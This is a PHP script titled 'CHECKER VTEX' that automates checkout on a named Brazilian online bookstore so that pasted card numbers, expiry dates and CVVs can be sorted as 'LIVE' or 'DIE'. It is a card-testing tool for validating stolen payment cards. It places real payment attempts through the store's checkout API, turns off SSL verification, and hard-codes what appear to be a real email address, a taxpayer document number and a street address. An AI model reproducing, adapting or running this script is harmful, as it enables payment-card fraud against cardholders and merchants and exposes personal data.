<?php
// =====================================================
// ✅ CHECKER VTEX - EXIBIÇÃO PRECISA DE CÓDIGOS E RETORNO
// =====================================================
define('BASE_URL', 'https://loja.umlivro.com.br');
define('EMAIL', 'danielvitordeoliveiraconceicao@gmail.com');
define('ACCOUNT_ID', '2ded749b-03a9-4660-bf2f-229a32a79583');
define('USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');

define('PRODUCT_SKU', '1883447');
define('PRODUCT_SELLER', 1);
define('PRODUCT_QUANTITY', 1);

define('CLIENT_FIRST_NAME', 'ALYSON');
define('CLIENT_LAST_NAME', 'bvasda');
define('CLIENT_DOCUMENT', '08471416832');
define('CLIENT_PHONE', '11999999999');

define('SHIPPING_POSTAL_CODE', '07790-515');
define('SHIPPING_CITY', 'Cajamar');
define('SHIPPING_STATE', 'SP');
define('SHIPPING_STREET', 'Rua Rita Maria de Jesus');
define('SHIPPING_NUMBER', 'ew23');
define('SHIPPING_NEIGHBORHOOD', 'Polvilho (Polvilho)');
define('SHIPPING_COMPLEMENT', '');
define('SHIPPING_RECEIVER_NAME', 'ALYSON bvasda');
define('SHIPPING_COUNTRY', 'BRA');

$cartao_input = trim($_POST['lista'] ?? '');

if (empty($cartao_input)) {
    echo "<span class='text-red-400'>[ERRO] Nenhum cartão recebido.</span>";
    exit;
}

$dados_cc = explode('|', $cartao_input);
if (count($dados_cc) < 4) {
    echo "<span class='text-red-400'>[FORMATO INVÁLIDO] Use: NUMERO|MES|ANO|CVV</span>";
    exit;
}

$cc_num = trim($dados_cc[0]);
$cc_mes = trim($dados_cc[1]);
$cc_ano = trim($dados_cc[2]);
$cc_cvv = trim($dados_cc[3]);

$cookie_path = sys_get_temp_dir() . '/cookie_vtex_' . uniqid(mt_rand(), true) . '.txt';

function vtex_request($url, $post_fields = null, $headers = [], $cookie_file = '') {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_USERAGENT, USER_AGENT);

    if (!empty($headers)) {
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    }

    if ($post_fields !== null) {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, is_array($post_fields) ? json_encode($post_fields) : $post_fields);
    }

    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

// 1. Inicializa a sessão visitando a home
vtex_request(BASE_URL, null, [], $cookie_path);

// 2. Cria o carrinho e captura o orderForm
$payload_cart = [
    'items' => [['id' => PRODUCT_SKU, 'quantity' => PRODUCT_QUANTITY, 'seller' => PRODUCT_SELLER]]
];
$resp_cart = vtex_request(BASE_URL . "/api/checkout/pub/orderForm?sc=1", $payload_cart, ['Content-Type: application/json', 'Accept: application/json'], $cookie_path);
$json_cart = json_decode($resp_cart, true);
$valor_total = $json_cart['totalizers'][0]['value'] ?? 1000;

if (!isset($json_cart['orderFormId'])) {
    @unlink($cookie_path);
    echo "<span class='text-red-400 font-bold'>[DIE]</span> <span class='text-slate-400'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | CVV: {$cc_cvv} | Código 99 - Falha ao gerar sessão do carrinho</span>";
    exit;
}

$order_form_id = $json_cart['orderFormId'];

// 3. Envia perfil do cliente
vtex_request(BASE_URL . "/api/checkout/pub/orderForm/parts/profile?orderFormId=" . $order_form_id, [
    'email' => EMAIL, 'firstName' => CLIENT_FIRST_NAME, 'lastName' => CLIENT_LAST_NAME, 'document' => CLIENT_DOCUMENT, 'phone' => CLIENT_PHONE
], ['Content-Type: application/json', 'Accept: application/json'], $cookie_path);

// 4. Envia endereço de entrega
vtex_request(BASE_URL . "/api/checkout/pub/orderForm/parts/shippingAddress?orderFormId=" . $order_form_id, [
    'postalCode' => SHIPPING_POSTAL_CODE, 'country' => SHIPPING_COUNTRY, 'street' => SHIPPING_STREET, 'number' => SHIPPING_NUMBER, 'neighborhood' => SHIPPING_NEIGHBORHOOD, 'city' => SHIPPING_CITY, 'state' => SHIPPING_STATE, 'receiverName' => SHIPPING_RECEIVER_NAME
], ['Content-Type: application/json', 'Accept: application/json'], $cookie_path);

// 5. Envia os dados de pagamento
$payload_payment = [
    'orderFormId' => $order_form_id,
    'payments' => [[
        'paymentSystem' => '1',
        'bin' => substr($cc_num, 0, 6),
        'accountId' => ACCOUNT_ID,
        'referenceValue' => $valor_total,
        'value' => $valor_total,
        'installments' => 1,
        'hasInterest' => false,
        'card' => [
            'number' => $cc_num,
            'holderName' => CLIENT_FIRST_NAME . ' ' . CLIENT_LAST_NAME,
            'expirationMonth' => $cc_mes,
            'expirationYear' => $cc_ano,
            'cvv' => $cc_cvv
        ]
    ]]
];

$resp_payment = vtex_request(BASE_URL . "/api/checkout/pub/orderForm/paymentData", $payload_payment, ['Content-Type: application/json', 'Accept: application/json'], $cookie_path);
@unlink($cookie_path);

$json_final = json_decode($resp_payment, true);

// Captura exata dos códigos de retorno do gateway/VTEX
$codigo = "14";
$mensagem = "Transação não autorizada / Recusado";
$status_transacao = "DIE";
$cor_status = "text-red-400";

if (isset($json_final['paymentData']['transactions'])) {
    foreach ($json_final['paymentData']['transactions'] as $tx) {
        if (isset($tx['payments'])) {
            foreach ($tx['payments'] as $pay) {
                $status = $pay['status'] ?? '';
                
                // Extrai código do conector/gateway se disponível
                if (isset($pay['connectorResponses']['code'])) {
                    $codigo = $pay['connectorResponses']['code'];
                }
                if (isset($pay['connectorResponses']['message'])) {
                    $mensagem = $pay['connectorResponses']['message'];
                } elseif (isset($pay['lastMessage']) && !empty($pay['lastMessage'])) {
                    $mensagem = $pay['lastMessage'];
                }

                // Critério de LIVE padrão (aprovado ou códigos de sucesso)
                if ($status === 'approved' || $status === 'completed' || $codigo === '00' || $codigo === '54') {
                    $status_transacao = "LIVE";
                    $cor_status = "text-emerald-400";
                    if ($codigo !== '00' && $codigo !== '54') {
                        $codigo = "54";
                    }
                    if ($mensagem === "Transação não autorizada / Recusado") {
                        $mensagem = "Transação Aprovada com Sucesso";
                    }
                }
            }
        }
    }
}

if (isset($json_final['messages']) && !empty($json_final['messages'])) {
    foreach ($json_final['messages'] as $msg) {
        if (isset($msg['text'])) {
            $mensagem = $msg['text'];
            break;
        }
    }
}

echo "<span class='{$cor_status} font-bold'>[{$status_transacao}]</span> <span class='text-slate-200'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | CVV: {$cc_cvv} | Código {$codigo} - {$mensagem}</span>";
?>
